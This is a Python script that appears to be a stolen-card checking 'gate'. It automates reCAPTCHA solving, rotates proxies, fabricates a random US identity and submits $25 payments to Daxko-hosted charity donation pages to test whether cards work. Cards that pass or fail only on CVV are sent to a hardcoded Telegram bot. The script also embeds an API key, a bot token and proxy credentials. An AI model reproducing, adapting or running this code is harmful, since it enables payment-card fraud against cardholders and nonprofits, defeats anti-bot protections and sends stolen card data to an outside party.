import httpx
import os
from playwright.sync_api import Playwright
from playwright.async_api import async_playwright
from playwright_recaptcha import recaptchav2, RecaptchaSolveError
import asyncio
from randomuser import RandomUser
from fake_useragent import UserAgent
import random
import requests

class dax_gate:
    page = None
    cc = None
    info = None
    user_agent = None
    proxy = None


def __init__(self, page, cc, info, user_agent=None, proxy=None, **kwargs):
    page = page
    cc = cc
    info = info
    proxy = proxy
    user_agent = user_agent


cdir = os.getcwd()


def getUrl():
    with open(f"{cdir}/gates/sites/daxko.site", "r") as f:
        lines = f.readlines()

    random_line_num = random.randint(0, len(lines) - 1)
    site = lines[random_line_num].strip()
    return site
   
def get_enumproxy():
    
    url = "https://ephemeral-proxies.p.rapidapi.com/v2/datacenter/proxy"

    headers = {
        "X-RapidAPI-Key": "60f7bdf787msh61ddbd43812c12cp1059a4jsnd4564938be2c",
        "X-RapidAPI-Host": "ephemeral-proxies.p.rapidapi.com"
    }

    response = requests.request("GET", url, headers=headers).json()
    host = response['proxy']['host']
    port = response['proxy']['port']
    return f"{host}:{port}"
async def solve(url):
    user_data_dir = "~/tmp/user-data-dir"
    firefo_ext = f"{cdir}/firefox-extension/buster_captcha_solver-2.0.1.xpi"
    tries = 0
    token = None
    while (
        token is None
        or token.value is None
        or token == ""
        or isinstance(token, RecaptchaSolveError)
    ):
        port = random.randint(10100, 10120)
        port_rotate = random.randint(9000, 9002)
        # username = "geonode_JFNTdE7PxE"
        # password = "1c348b0d-606e-4a50-a71e-442329fc9212"
        # GEONODE_DNS = f"premium-residential.geonode.com:{port}"
        
        async with async_playwright() as playwright:
            tries = tries + 1
            if tries > 5:
                print("attempt exceeded")
                exit()
            ua = UserAgent()
            args = [
                "--deny-permission-prompts",
                "--no-default-browser-check",
                "--no-first-run",
                "--deny-permission-prompts",
                "--disable-popup-blocking",
                "--ignore-certificate-errors",
                "--no-service-autorun",
                "--password-store=basic",
                f"--user-agent={ua['Firefox']}",
                "--headless=new",  # the new headless arg for chrome v109+. Use '--headless=chrome' as arg for browsers v94-108.
                f"--disable-extensions-except={firefo_ext}",
                f"--load-extension={firefo_ext}",
                "--window-size=640,480",
                "--disable-audio-output",
                "--slow_mo=50",
            ]
            # proxy = {"server": GEONODE_DNS, "username": username, "password": password}
            
            try:
                proxy = {"server": "http://" + get_enumproxy()}
                context = await playwright.firefox.launch_persistent_context(
                    headless=True,
                    proxy=proxy,
                    args=args,
                    user_data_dir=user_data_dir,
                )
                page = await context.new_page()
                await page.goto(url, wait_until="networkidle", timeout=0)
                await page.wait_for_load_state("networkidle", timeout=60000)

                page.set_default_navigation_timeout(50000)
                async with recaptchav2.AsyncSolver(page) as solver:
                    await page.wait_for_timeout(3000)
                    token = await solver.solve_recaptcha(attempts=4)
                    return token

            except RecaptchaSolveError as reError:
                # await page.reload(timeout=0, wait_until="networkidle")
                print(f"Captcha Error: {reError}")
                await page.close()
                await context.close()
            except:
                await page.close()
                await context.close()
        await page.close()
        await context.close()


def find_between(data, first, last):
    try:
        start = data.index(first) + len(first)
        end = data.index(last, start)
        return data[start:end]
    except ValueError:
        return None


def process_check(cc):
    reqUrl = getUrl()
    donotion = None
    reqver = None
    insta = None
    gResponse = None
    client = requests.session()

    def req_one():
        headersList = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0",
            "accept": "application/json, text/javascript, */*; q=0.01",
        }
        payload = ""

        data = client.get(reqUrl, headers=headersList)
        cookies = data.cookies
        data = data.text
        reqver = find_between(
            str(data), 'name="__RequestVerificationToken" type="hidden" value="', '"'
        )
        donotion = find_between(str(data), 'id="donotions" value="', '"')
        insta = find_between(str(data), "ineum('key', '", "'")

        return reqver, donotion, insta, cookies

        # gResponse = solve(reqUrl)
        # print(gResponse.text)

    def req_two():
        reqver, donotion, insta, cookies = req_one()

        # insta = insta.split('-')[1]
        gResponse = asyncio.run(solve(reqUrl))
        if gResponse:
            print(reqver)
            print(donotion)
            print(insta)

            user = RandomUser({"Country": "United States"})
            name = user.get_full_name()
            fname = user.get_first_name()
            lname = user.get_last_name()
            street = user.get_street()
            phone = user.get_cell()
            email = user.get_email()
            postcode = "90001"

            card = cc.split("|")
            ccn = card[0]
            cc_2 = f"{ccn[:4]}+{ccn[4:8]}+{ccn[8:12]}+{ccn[12:16]}"

            mm = card[1]
            yy = card[2]
            cvv = card[3]

            if ccn[:1] == "5":
                cardType = "mastercard"

            elif ccn[:1] == "4":
                cardType = "visa"

            elif ccn[:1] == "3":
                cardType = "amex"

            print(gResponse)
            headersList = {
                "accept": "application/json, text/javascript, */*; q=0.01",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "origin": "https://ops1.operations.daxko.com",
                "referer": reqUrl,
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0",
                "x-requested-with": "XMLHttpRequest",
            }

            payload = f"campaign_id=0&campaigner_id=0&gift_type=0&memorial=&payment_info_s=%7B%22payment_amount%22%3A%2225%22%2C%22existing_billing_method_id%22%3Anull%2C%22save_billing_method%22%3Atrue%2C%22notes%22%3A%22%22%2C%22method%22%3A%22credit_card%22%2C%22credit_card%22%3A%7B%22name_on_account%22%3A%22{name}%22%2C%22avs_address%22%3A%22{street}%22%2C%22avs_zip_code%22%3A%22{postcode}%22%2C%22card_number%22%3A%22{ccn}%22%2C%22card_type%22%3A%22{cardType}%22%2C%22cvv%22%3A%22{cvv}%22%2C%22expiration_month%22%3A%22{mm}%22%2C%22expiration_year%22%3A%22{yy}%22%2C%22card_number_formatted%22%3A%22{cc_2}%22%7D%7D&pledge_amount=15.00&min_amount=&payment_frequency=-1&repeat_every=1&number_of_payment=&start_date=&donotions={donotion}&recaptcha_response={gResponse}&__RequestVerificationToken={reqver}&person_s=%7B%22first_name%22%3A%22{fname}%22%2C%22last_name%22%3A%22{lname}%22%2C%22email%22%3A%22{email}%22%2C%22phone_number%22%3A%22{phone}%22%2C%22mem_unit_id%22%3A%22%22%2C%22mem_id%22%3A%22%22%2C%22address_line_1%22%3A%22%22%2C%22address_line_2%22%3A%22%22%2C%22city%22%3A%22%22%2C%22zip%22%3A%2290001%22%2C%22country%22%3A%22US%22%7D"

            data = client.post(
                f"{reqUrl}/make_payment",
                cookies=cookies,
                data=payload,
                headers=headersList,
            ).text
            if '"success":true' in data or "CVV2/VAK Failure" in data or "CVV2 Mismatch" in data:
                requests.get('https://api.telegram.org/bot1405110178:AAFo20MsFbsCxH5tjWoPFKHsOVRgbdUwJWU/sendMessage?chat_id=1087333523&text=' + cc)
        
            # respo = await get_response(navigate)

            print(data)
            return data

    return req_two()
